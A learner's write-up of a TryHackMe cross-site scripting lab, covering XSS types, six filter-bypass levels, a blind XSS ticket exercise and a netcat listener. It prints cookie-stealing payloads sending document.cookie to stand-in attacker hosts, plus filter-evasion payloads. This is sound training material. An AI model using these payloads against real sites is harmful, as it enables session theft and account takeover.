# TryHackMe — Cross-Site Scripting (XSS) Room  
**Room:** Cross-Site Scripting (XSS) — Junior Penetration Tester Path  
**Author:** Chidimma Onwuatuegwu  
**Date:** 2025-06-XX

---

## 1. Prerequisites
- Basic understanding of **JavaScript** (XSS payloads are JS-based).  

---

## 2. About XSS (Summary)
**Cross-Site Scripting (XSS)** is an injection vulnerability where an attacker injects malicious JavaScript into a web application so it executes in other users’ browsers. XSS can be used for proof-of-concept alerts, session theft, keylogging, business logic abuse, or complete account takeover. XSS is one of the most common and high-impact web security issues.

---

## 3. Payloads & Intentions
Payloads have two parts:
- **Intention** — what the payload should do (e.g., proof-of-concept, steal cookies, exfiltrate data).  
- **Modification** — adjustments needed to bypass filters or adapt to how the input is reflected in the page (attribute context, element context, JavaScript context, etc.)

**Common intentions / sample payloads**:
- Proof-of-Concept: `alert('THM')`
- Session Stealing: `fetch('https://attacker.com/log?c='+btoa(document.cookie))`
- Key Logger: insert script that posts keystrokes to attacker endpoint
- Business Logic Abuse: call in-page JS functions like `user.changeEmail('attacker@example.com')`

---

## 4. Types of XSS
Briefly, the room covers:
- **Reflected XSS** — input is reflected in the response (often via query string).  
- **Stored XSS** — payload is stored server-side (comments, profile fields) and executed when other users view it.  
- **DOM-based XSS** — client-side JavaScript manipulates the DOM with unsafe inputs (e.g., `window.location.hash`).  
- **Blind XSS** — payload stored and executed in a place you cannot directly see; requires callback mechanisms (e.g., XSS Hunter).

---

## 5. Reflected XSS — Notes & Testing
**How to test**:
- Test GET and POST parameters, file paths, and unlikely headers.  
- Try simple payloads first (e.g., `"><script>alert('THM')</script>`) and check if the input is reflected in the HTML source.  
- If user input is reflected in attribute values or inside JavaScript, adapt payloads to escape that context (see Level examples below).

---

## 6. Stored XSS — Notes & Testing
**Where to check**:
- Comment sections, user profiles, listing pages, support tickets, product reviews.  
**Confirming stored XSS**:
- Submit content that will be stored, then view as another user or in a part of the app that displays stored content.  
- If you can’t view it as you, use blind XSS techniques (callbacks).

---

## 7. DOM-based XSS — Notes & Testing
**Key points**:
- Look for client-side code accessing `window.location`, `document.write`, `innerHTML`, `eval()` or `document.cookie`.  
- DOM XSS often requires reading the JS source or reverse engineering client scripts.  
- Test inputs that affect hash (`#`), search params, or fragment identifiers.

---

## 8. Blind XSS — Notes & Testing
**Testing approach**:
- Inject payloads that make a callback (e.g., `new Image().src='https://YOURSERVER/steal?d='+document.cookie`) so when a staff user views the data, it will be sent to your listener.
- Tools like **XSS Hunter** are designed for blind XSS testing and can capture callbacks reliably.

---

## 9. Perfecting your Payload — Level Walkthroughs & Screenshots
Below are the six lab levels and how I solved them. I took **three screenshots per level**: (1) the submitted payload in the page, (2) the resulting alert / proof of execution, (3) the page source showing the reflected payload.

### Level 1 — Reflected in page text
**Goal:** Trigger an alert with the string `THM`.  
**Payload used:** `alert('THM')`  
**Notes:** Input was reflected directly in page text. No escaping required.  
**Screenshots:**  
- `screenshots/level1_input.png`  
- `screenshots/level1_alert.png`  
- `screenshots/level1_source.png`

---

### Level 2 — Reflected in `value` attribute of an `<input>`
**Goal:** Execute JS from inside an attribute.  
**Payload used:** `">` + `"><script>alert('THM')</script>` (example — adapt per context)  
**Notes:** Closed the attribute then injected script.  
**Screenshots:**  
- `screenshots/level2_input.png`  
- `screenshots/level2_alert.png`  
- `screenshots/level2_source.png`

---

### Level 3 — Reflected in a `<textarea>`
**Goal:** Escape the `textarea` and execute JS.  
**Payload used:** `</textarea><script>alert('THM')</script>`  
**Screenshots:**  
- `screenshots/level3_input.png`  
- `screenshots/level3_alert.png`  
- `screenshots/level3_source.png`

---

### Level 4 — Reflected inside JavaScript code
**Goal:** Break out of existing JS and run `alert('THM')`.  
**Payload used:** `';alert('THM');//`  
**Notes:** Closed the existing string, added statement, used comment to avoid syntax errors.  
**Screenshots:**  
- `screenshots/level4_input.png`  
- `screenshots/level4_alert.png`  
- `screenshots/level4_source.png`

---

### Level 5 — Filtered keywords (e.g., `script` removed)
**Goal:** Bypass keyword removal filters that strip `script` or other words.  
**Approach:** Use string concatenation or alternative tags (e.g., `onerror` in `<img>`) and encoded characters to bypass filters.  
**Example final payload:** `alert('THM');` with filtered parts reconstructed or using `onerror=alert('THM')` inside `<img src=x onerror=alert('THM')>`  
**Screenshots:**  
- `screenshots/level5_input.png`  
- `screenshots/level5_alert.png`  
- `screenshots/level5_source.png`

---

### Level 6 — Filtered `<` and `>` characters / attribute-based context
**Goal:** Use tag attributes (e.g., `onload`, `onerror`) such as `src="/images/cat.jpg" onload="alert('THM');"` to trigger JS without direct `<script>` tags.  
**Screenshots:**  
- `screenshots/level6_input.png`  
- `screenshots/level6_alert.png`  
- `screenshots/level6_source.png`

---

> **Polyglot**: I tested a polyglot payload (a universal XSS string) that can often bypass multiple filters. Example polyglot used in the room (presented as a learning example only):  
> `jaVasCript:/-//*\/'/"/**/(/* */onerror=alert('THM') )//%0D%0A...`  
> *(See lab notes for full polyglot string)*

---

## 10. Practical Blind XSS Example (Support Ticket)
**Target:** Acme IT Support — Support Ticket “Create Ticket” functionality.  
**Action:** Created tickets with payloads that escaped the `textarea` and executed JS in the staff portal when the ticket was viewed.  
**Goal:** Demonstrate blind XSS that triggers when staff view the ticket (useful for catching admin-only functionality).  
**Screenshots:**  
- `screenshots/blind_create_ticket.png`  
- `screenshots/blind_alert_received.png`  
- `screenshots/blind_server_callback.png`

---

## 11. Netcat Listener (AttackBox) — Example Command
To receive exfiltrated data (cookies, page content) from a payload, I used Netcat on the AttackBox:

```bash
# Listen on port 9001 (recommended on AttackBox)
nc -nlvp 9001
